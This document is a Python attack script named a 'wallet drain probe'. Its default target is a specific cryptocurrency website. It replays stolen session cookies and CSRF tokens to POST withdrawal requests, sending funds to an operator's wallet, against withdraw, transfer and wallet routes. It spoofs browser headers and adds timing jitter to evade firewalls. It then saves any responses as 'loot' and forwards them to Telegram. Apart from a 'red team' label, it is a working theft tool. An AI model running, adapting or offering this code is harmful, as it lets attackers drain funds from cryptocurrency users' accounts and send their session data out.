#!/usr/bin/env python3
"""
WALLET_DRAIN_PROBE.PY v8.7 — Automated Endpoint Discovery & Balance Assault (Elite Red Team Adversarial Edition)
Features:
- Dynamic multi-target URL ingestion (Zero hardcoded domains)
- Comprehensive dashboard, asset, wallet, and financial route enumeration with SHA-256 integrity mapping
- Pre-flight session and CSRF cookie/header synchronization with WAF client hints
- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and forensic proof-of-work streaming
- Real-time unredacted Telegram notification dispatch for active asset and financial endpoint hits
"""
import sys
import httpx
import hashlib
import asyncio
from urllib.parse import urlsplit

# Import centralized framework telemetry, immutable loot persistence, behavioral mimicry, and Telegram notifier
from modules.loot_logger import save_session_loot
from modules.telemetry import stream_proof
from modules.telegram_notifier import send_telegram_alert
from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints

async def broadcast_tg_alert_async(loot_type, details):
    try:
        await send_telegram_alert(loot_type, details)
    except Exception:
        pass

def broadcast_tg_alert_sync(loot_type, details):
    """Helper to non-blockingly fire Telegram alerts from synchronous probe functions."""
    try:
        loop = asyncio.get_running_loop()
        if loop.is_running():
            loop.create_task(broadcast_tg_alert_async(loot_type, details))
        else:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
    except RuntimeError:
        try:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
        except Exception:
            pass

def execute_probe(target_host=None, session_cookies=None, csrf_token=None, target_wallet=None):
    # Resolve target URL dynamically
    target_url = target_host if target_host else "https://cryptobytes.online"
    if "://" not in target_url:
        target_url = "https://" + target_url
    
    parsed = urlsplit(target_url)
    base_domain = f"{parsed.scheme}://{parsed.netloc}"

    # Expanded route map covering dashboards, asset pages, wallets, and transfers
    relative_endpoints = [
        "/dashboard",
        "/user/dashboard",
        "/user/wallet",
        "/user/assets",
        "/user/portfolio",
        "/user/balances",
        "/api/user/wallet",
        "/user/withdraw",
        "/user/withdraw/money",
        "/user/withdraw/store",
        "/user/transfer-balance",
        "/user/exchange"
    ]
    
    endpoints = [f"{base_domain}{ep}" for ep in relative_endpoints]
    cookies = session_cookies or {}
    
    payload = {
        "_token": csrf_token or "default_token",
        "amount": "100",
        "wallet_address": target_wallet or "operator_wallet_destination"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": f"{base_domain}/user/dashboard"
    }
    headers.update(get_randomized_hints())

    sys.stdout.write(f"\033[96m[*] Starting comprehensive asset & financial endpoint enumeration on {base_domain} (v8.7)...\033[0m\n")
    sys.stdout.flush()

    with httpx.Client(verify=False, cookies=cookies, timeout=10.0, follow_redirects=False) as client:
        for url in endpoints:
            apply_behavioral_jitter()
            try:
                resp = client.post(url, data=payload, headers=headers)
                sys.stdout.write(f"\033[90m[*] Probing -> {url} [Status: {resp.status_code}]\033[0m\n")
                sys.stdout.flush()

                if resp.status_code not in (404, 500, 419):
                    sys.stdout.write(f"\033[91m[!] ACTIVE ROUTE HIT! Response snippet: {resp.text[:300]}\033[0m\n")
                    sys.stdout.flush()
                    
                    loot_hash = hashlib.sha256(resp.text.encode("utf-8", errors="ignore")).hexdigest()
                    loot_payload = {
                        "endpoint": url,
                        "status": resp.status_code,
                        "integrity_hash": loot_hash,
                        "response_excerpt": resp.text[:400]
                    }

                    # BROADCAST, STREAM PROOF & PERSIST TO IMMUTABLE DISK
                    broadcast_tg_alert_sync("Wallet Drain / Financial Route Hit", loot_payload)
                    stream_proof("WALLET_DRAIN_PROBE_HIT", url, {"status": resp.status_code, "hash": loot_hash}, resp.text[:300], loot_payload)
                    save_session_loot(
                        target=base_domain,
                        endpoint=url,
                        finding_type="WALLET_DRAIN_ROUTE_HIT",
                        status=resp.status_code,
                        headers=dict(resp.headers),
                        body=resp.text,
                        extra_loot=loot_payload
                    )
                    return url, resp.text
            except Exception as exc:
                sys.stdout.write(f"\033[91m[-] Connection error on {url}: {exc}\033[0m\n")
                sys.stdout.flush()
                
    return None, None

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://cryptobytes.online"
    execute_probe(target_host=target)
